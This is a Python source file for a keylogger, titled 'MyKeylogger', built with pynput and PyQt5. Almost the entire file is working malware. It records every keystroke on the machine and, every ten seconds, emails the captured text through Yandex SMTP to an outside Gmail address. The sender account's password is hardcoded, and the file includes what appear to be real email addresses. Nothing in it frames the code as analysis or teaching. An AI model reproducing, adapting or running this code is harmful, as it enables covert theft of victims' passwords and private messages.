import sys
import threading
from PyQt5.QtWidgets import QApplication, QMainWindow, QTextEdit, QLineEdit
import pynput.keyboard
import smtplib
from getpass import getpass

log = ""

class KeyloggerThread(threading.Thread):
    def __init__(self):
        super().__init__()
        self.keyloggerListener = pynput.keyboard.Listener(on_press=self.callbackFunc)
        self.log = ""

    def callbackFunc(self, key):
        try:
            self.log += key.char
        except AttributeError:
            if key == key.space:
                self.log += " "
            else:
                self.log += str(key)

    def run(self):
        self.keyloggerListener.start()
        self.send_email_periodically()

    def send_email_periodically(self):
        while True:
            if self.log:
                send_email_thread = threading.Thread(target=self.send_email, args=(self.log,))
                send_email_thread.start()
                self.log = ""
            threading.Event().wait(10)  # wait for 10 seconds before checking again

    def send_email(self, message):
        email = "drewbarrymore34@yandex.com"
        password = "360d0e1bbb9946132a3ec4f7a1e49bee"
        try:
            emailServer = smtplib.SMTP_SSL("smtp.yandex.com", 465)
            emailServer.login(email, password)
            emailServer.sendmail(email, "ahmetzincir27@gmail.com", message)
            emailServer.quit()
            print("Email sent successfully!")
        except Exception as e:
            print("Email sending error:", e)

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setGeometry(100, 100, 400, 250)
        self.setWindowTitle("MyKeylogger")

        self.text_edit = QTextEdit(self)
        self.text_edit.move(50, 50)
        self.text_edit.resize(300, 150)
        self.text_edit.setEnabled(False)
        self.text_edit.setStyleSheet("color: red;")

        self.search_edit = QLineEdit(self)
        self.search_edit.move(50, 20)
        self.search_edit.resize(300, 20)
        self.search_edit.setStyleSheet("color: blue;")

        self.keylogger_thread = KeyloggerThread()
        self.keylogger_thread.start()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())
